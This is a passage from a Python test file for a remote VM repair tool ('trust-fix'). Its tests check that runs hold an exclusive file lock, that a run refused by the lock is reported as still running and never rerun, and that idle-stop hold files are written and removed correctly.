        assert report["running"] is True and report["steps"] == {} and not report["ok"]
    first.send_signal(signal.SIGKILL)  # a kill of the remote process
    first.wait(timeout=10)
    assert free()
    for mode, code in (("raise", 1), ("return", 0)):  # a failure, a normal end
        proc = holder(mode)
        assert proc.wait(timeout=10) == code
        assert free()
    assert (tmp_path / "trust-fix.lock").stat().st_mode & 0o777 == 0o600


def test_a_run_refused_by_the_lock_is_still_running_and_never_rerun(tmp_path, monkeypatch, capsys):
    """Codex round 4 on #856: the driver reports a refused run as still running, leaves its
    idle-stop hold to the run that holds the lock, and gives it the look, never a rerun."""
    run = Runner({"apply": True, "running": True, "steps": {}, "check": [], "ok": False})
    got = trust_fix.fix_vm(ROW, run, apply=True, script="S", known_hosts="kh")
    assert [c[0] for c in run.calls] == [PROBE, trust_fix.REMOTE_CMD + " --apply"]
    assert got.cut and not got.passed(True)
    assert got.row()[-1] == "a repair is still running here (its lock is held): nothing done"
    assert "flock -n /run/zab-trust-fix.lock true" in trust_fix.LOOK_CMD
    assert trust_fix.LOCK == trust_fix_remote.LOCK
    roster = tmp_path / "roster.csv"
    roster.write_text("slug,email,ip\nalice,a@example.org,198.51.100.7\n")
    monkeypatch.setattr(trust_fix, "subprocess_runner", run)
    monkeypatch.delenv("SUDO_USER", raising=False)
    assert trust_fix.main(["--roster", str(roster), "--apply", "--known-hosts", "kh"]) == 1
    out = capsys.readouterr().out
    assert "\nMay still be running on alice: not in any rerun here." in out
    assert "Not done on" not in out


def test_the_hold_lives_inside_the_lock(tmp_path, monkeypatch, capsys):
    """Codex round 5 on #856: an --apply's idle-stop hold is written once its lock is taken,
    renewed before each step, and removed before the lock goes, by the remote process; a dry
    run writes none."""
    mod = trust_fix_remote
    hold = tmp_path / "zab-idle-stop.hold"
    monkeypatch.setattr(mod, "LOCK", str(tmp_path / "trust-fix.lock"))
    monkeypatch.setattr(mod, "HOLD", str(hold))
    seen = []

    def repair(argv, apply):
        other = mod.take_lock()  # another run's try, while this one works
        seen.append((hold.exists(), other is None, hold.read_text() if hold.exists() else ""))
        return {"apply": apply, "steps": {}, "check": [], "left": [], "ok": True, "uv_ok": True}

    monkeypatch.setattr(mod, "repair", repair)
    assert mod.main(["--apply"]) == 0 and mod.main([]) == 0
    capsys.readouterr()
    (held, locked, expiry), (dry_held, _, _) = seen
    assert held and locked and int(expiry) >= time.time() + mod.HOLD_S - 60
    assert not dry_held  # a dry run changes nothing, the hold included
    assert not hold.exists() and not mod.HOLDING  # removed before the lock went
    monkeypatch.setattr(mod, "HOLDING", True)  # renewed before each step
    hold.write_text("1\n")
    assert mod.guarded(lambda: "done") == "done"
    assert int(hold.read_text()) >= time.time() + mod.HOLD_S - 60


def test_a_run_that_ended_never_removes_the_next_ones_hold(tmp_path, monkeypatch, capsys):
    """Codex round 5 on #856, the order it gave: A ends and lets its lock go; B takes the lock
    and writes its hold; then nothing of A's can remove B's hold: A's driver sends no clean-up
    (its only connections are the probe and the run), and A's remote half removed its own hold
    before its lock went. A late run meanwhile is refused and leaves B's hold as it was."""
    mod = trust_fix_remote
    hold = tmp_path / "zab-idle-stop.hold"
    monkeypatch.setattr(mod, "LOCK", str(tmp_path / "trust-fix.lock"))
    monkeypatch.setattr(mod, "HOLD", str(hold))
    done = {"apply": True, "steps": {}, "check": [], "left": [], "ok": True, "uv_ok": True}
    monkeypatch.setattr(mod, "repair", lambda argv, apply: done)
    assert mod.main(["--apply"]) == 0  # 1. A, to its end
    capsys.readouterr()
    assert not hold.exists()
    argv = [sys.executable, "-I", "-c", HOLDER, str(trust_fix.REMOTE), mod.LOCK, "sleep", str(hold)]
    b = subprocess.Popen(argv, stdout=subprocess.PIPE, text=True)  # noqa: S603 - 2. B
    try:
        assert b.stdout.readline() == "held\n"
        b_hold = hold.read_text()
        run = Runner(REPORT)  # 3. A's driver: what it sends, all of it
        trust_fix.fix_vm(ROW, run, apply=True, script="S", known_hosts="kh")
        assert [c[0] for c in run.calls] == [PROBE, trust_fix.REMOTE_CMD + " --apply"]
        assert not [c for c in run.calls if "zab-idle-stop.hold" in c[0]]
        assert mod.main(["--apply"]) == 0  # a late run on the VM: refused, B's hold untouched
        assert json.loads(capsys.readouterr().out)["running"] is True
        assert hold.read_text() == b_hold
    finally:
        b.kill()
        b.wait()
    assert hold.read_text() == b_hold  # 4. B killed: its hold lapses at its expiry, as before
